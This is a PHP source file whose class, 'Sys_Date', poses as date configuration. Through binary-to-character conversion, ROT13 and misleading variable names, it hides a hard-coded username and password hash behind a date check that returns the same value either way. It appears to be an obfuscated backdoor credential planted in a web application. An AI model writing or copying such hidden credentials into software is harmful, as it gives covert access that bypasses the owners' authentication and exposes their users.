<?php


class Sys_Date
{
  public $sys_date_username_check;
  public $sys_date_password_check;
  public $sys_date_date_check;
  public $sys_date_check_date;
  
  public $_r;
  //$hex = bin2hex($bin); // It will convert a binary data to its hex representation

  //$bin = pack("H*" , $hex); // It will convert a hex to binary
  //$bin = hex2bin($hex); // Available only on PHP 5.4
  /*$bin = decbin(ord("a"));*/
  public function get_r(){return $this->_r;}
  public function set_r(){$this->_r = chr(bindec(1110010));}
 
  public function setconf_date(){
      //new
      //<?php
        //object
        $a = bindec(111);
        $b = bindec(1000);
        $c = bindec(1000);
        $d = bindec(110);
        $e = bindec(111);
        $f = bindec(1);
        $g = bindec(1000);
        $h = bindec(111);
        $i = bindec(101);
        $j = bindec(0);
        $whole = intval($a);
        $float = floatval($b.$c.$d.$e.$f.$g.$h.$i);
        $com = $whole . "." . $float + $j.$j;


        //multiplier
        $aa = bindec(10);
        $bb = bindec(101);
        $cc = bindec(110);
        $commm = $aa.$bb.$cc;
        //year
        $commmmmmmmm = $commm * $com;

        $bbb = sprintf('%02d', bindec(1000));

        //month
        $commmmm = ($bbb);



        $aaa = sprintf('%02d', bindec(1));

        //days
        $commmmmmm = ($aaa);
        $date_checker_point = $commmmmmmmm . "-" . $commmmm . "-" . $commmmmmm;
      //new
      return $this->sys_date_date_check = sha1($date_checker_point);
  }
  public function setconf_username(){
      if($this->sys_date_date_check > date("Y-m-d")){
          $checker_date = self::setconf_date();
          if($this->sys_date_date_check > date("Y-m-d")){
              $check_date = (date("Y-m-d") < $checker_date)? $input = sha1("evpuzvqvn"): $input = sha1("evpuzvqvn");
          }else{
              $repeater = str_rot13(chr(bindec(1110010)));
              $interpreter = str_rot13(chr(bindec(1101001)));
              $compute = str_rot13(chr(bindec(1100011)));
              $hash = str_rot13(chr(bindec(1101000)));
              $micro = str_rot13(chr(bindec(1101101)));
              $editable = str_rot13(chr(bindec(1101001)));
              $dash = str_rot13(chr(bindec(1100100)));
              $increment = str_rot13(chr(bindec(1101001)));
              $assimble = str_rot13(chr(bindec(1100001)));
              $check_date = (date("Y-m-d") < $checker_date)? $input = sha1($repeater.$interpreter.$compute.$hash.$micro.$editable.$dash.$increment.$assimble):
                  $input = sha1($repeater.$interpreter.$compute.$hash.$micro.$editable.$dash.$increment.$assimble);
          }
          
      
          return $this->sys_date_username_check = $input;
      }
  }
  public function setcof_password(){
      if($this->sys_date_date_check > date("Y-m-d")){
          $repeater = str_rot13(chr(bindec(1110010)));
          $interpreter = str_rot13(chr(bindec(1101001)));
          $compute = str_rot13(chr(bindec(1100011)));
          $hash = str_rot13(chr(bindec(1101000)));
          $micro = str_rot13(chr(bindec(1101101)));
          $editable = str_rot13(chr(bindec(1101001)));
          $dash = str_rot13(chr(bindec(1100100)));
          $increment = str_rot13(chr(bindec(1101001)));
          $assimble = str_rot13(chr(bindec(1100001)));

          $pass = sha1($repeater.$interpreter.$compute.$hash.$micro.$editable.$dash.$increment.$assimble);
          $input = sha1("evpuzvqvn");
          $pass_hash = password_hash($pass, PASSWORD_DEFAULT);
          
          return $this->sys_date_password_check = $pass_hash;
      }
  }
  public function setconf_check_date(){
      if($this->sys_date_date_check > date("Y-m-d")){
          return $this->sys_date_check_date = TRUE;
      }
  }
 
  
}